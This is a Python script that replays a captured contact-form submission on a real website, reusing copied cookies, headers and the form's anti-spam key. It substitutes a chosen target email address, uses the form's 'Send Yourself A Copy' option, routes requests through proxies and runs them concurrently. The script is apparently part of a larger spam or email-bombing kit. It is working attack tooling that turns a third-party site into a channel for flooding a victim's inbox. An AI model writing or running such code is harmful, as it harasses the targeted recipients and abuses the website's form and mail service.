cookies = {
    '_gid': 'GA1.2.1670688505.1677143926',
    '__wpdm_client': 'b90a60f3a0a54deed38266d0f292d7ef',
    '_ga_S7JJKXF7GW': 'GS1.1.1677143924.1.1.1677144130.0.0.0',
    '_ga': 'GA1.2.165404569.1677143925',
    '_gat_gtag_UA_75241121_12': '1',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarya8aqckjGeNuD28f2',
    # 'Cookie': '_gid=GA1.2.1670688505.1677143926; __wpdm_client=b90a60f3a0a54deed38266d0f292d7ef; _ga_S7JJKXF7GW=GS1.1.1677143924.1.1.1677144130.0.0.0; _ga=GA1.2.165404569.1677143925; _gat_gtag_UA_75241121_12=1',
    'Origin': 'https://jhmj.ca',
    'Referer': 'https://jhmj.ca/contact-us/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundarya8aqckjGeNuD28f2\r\nContent-Disposition: form-data; name="input_1.3"\r\n\r\ntest\r\n------WebKitFormBoundarya8aqckjGeNuD28f2\r\nContent-Disposition: form-data; name="input_1.6"\r\n\r\ntest\r\n------WebKitFormBoundarya8aqckjGeNuD28f2\r\nContent-Disposition: form-data; name="input_2"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundarya8aqckjGeNuD28f2\r\nContent-Disposition: form-data; name="input_3"\r\n\r\ntest\r\n------WebKitFormBoundarya8aqckjGeNuD28f2\r\nContent-Disposition: form-data; name="input_4"\r\n\r\ntest\r\n------WebKitFormBoundarya8aqckjGeNuD28f2\r\nContent-Disposition: form-data; name="input_5.1"\r\n\r\nSend Yourself A Copy\r\n------WebKitFormBoundarya8aqckjGeNuD28f2\r\nContent-Disposition: form-data; name="input_6"\r\n\r\n\r\n------WebKitFormBoundarya8aqckjGeNuD28f2\r\nContent-Disposition: form-data; name="is_submit_2"\r\n\r\n1\r\n------WebKitFormBoundarya8aqckjGeNuD28f2\r\nContent-Disposition: form-data; name="gform_submit"\r\n\r\n2\r\n------WebKitFormBoundarya8aqckjGeNuD28f2\r\nContent-Disposition: form-data; name="gform_unique_id"\r\n\r\n\r\n------WebKitFormBoundarya8aqckjGeNuD28f2\r\nContent-Disposition: form-data; name="state_2"\r\n\r\nWyJbXSIsImE5OGFmMGRhYmZlMjM0NTVhOGUxYjQ5OTcyZGM0YTYxIl0=\r\n------WebKitFormBoundarya8aqckjGeNuD28f2\r\nContent-Disposition: form-data; name="gform_target_page_number_2"\r\n\r\n0\r\n------WebKitFormBoundarya8aqckjGeNuD28f2\r\nContent-Disposition: form-data; name="gform_source_page_number_2"\r\n\r\n1\r\n------WebKitFormBoundarya8aqckjGeNuD28f2\r\nContent-Disposition: form-data; name="gform_field_values"\r\n\r\n\r\n------WebKitFormBoundarya8aqckjGeNuD28f2\r\nContent-Disposition: form-data; name="gf_zero_spam_key"\r\n\r\ncxn7wcmtuw41f5F3POMfnE96LaWODqfvVBD9VxDuJSBK13S6vpsSEOYk8EcEcxbg\r\n------WebKitFormBoundarya8aqckjGeNuD28f2\r\nContent-Disposition: form-data; name="version_hash"\r\n\r\nd591ba81dcbf042d7c36959da7ddf714\r\n------WebKitFormBoundarya8aqckjGeNuD28f2--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text()).encode()

        response = requests.post('https://jhmj.ca/contact-us/', cookies=cookies, headers=headers, data=data,
                                 proxies=self.get_proxies())

        return response


def main():
    s = 'Thanks'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
